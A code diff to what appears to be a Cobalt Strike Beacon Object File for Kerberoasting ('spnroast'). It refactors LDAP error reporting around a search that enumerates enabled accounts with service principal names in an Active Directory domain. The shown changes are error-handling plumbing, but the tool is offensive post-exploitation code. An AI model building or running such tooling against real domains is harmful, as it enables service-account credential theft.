@@ -264,6 +264,7 @@ void go(char *args, int alen)
     int olen = 0;
     char user[256], realm[256], base[512];
     LDAP *ld = NULL;
+    ULONG rc = LDAP_SUCCESS;
     int total = 0;
 
     BeaconDataParse(&parser, args, alen);
@@ -285,14 +286,17 @@ void go(char *args, int alen)
         return;
     }
 
-    ld = bof_ldap_open();
+    ld = bof_ldap_open_ex(&rc);
     if (!ld) {
-        BeaconPrintf(CALLBACK_ERROR,
-                     "LDAP connect/bind failed (use: spnroast <spn>)\n");
+        bof_error_ldap("ldap_init/bind", rc,
+                       "cannot reach or authenticate to a domain controller");
         return;
     }
-    if (bof_ldap_default_nc(ld, base, sizeof(base)) == 0)
+    if (bof_ldap_default_nc_ex(ld, base, sizeof(base), &rc) == 0)
         nc_to_realm(base, realm, sizeof(realm));
+    else
+        bof_error_ldap("rootDSE defaultNamingContext", rc,
+                       "falling back to USERDNSDOMAIN for the realm");
     if (!realm[0]) {
         BeaconPrintf(CALLBACK_ERROR, "cannot determine realm from LDAP/%USERDNSDOMAIN\n");
         WLDAP32$ldap_unbind(ld);
@@ -316,8 +320,9 @@ void go(char *args, int alen)
                 "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
                 attrs, 0, NULL, NULL, NULL, 500, &res);
         if (rc != LDAP_SUCCESS) {
-            BeaconPrintf(CALLBACK_ERROR, "LDAP search failed: %lu (%s)\n",
-                         (unsigned long)rc, WLDAP32$ldap_err2stringA(rc));
+            bof_error_ldap("ldap_search(servicePrincipalName)", rc,
+                           "cannot enumerate SPN-bearing accounts");
+            bof_error_context("base", base);
             WLDAP32$ldap_unbind(ld);
             return;
         }
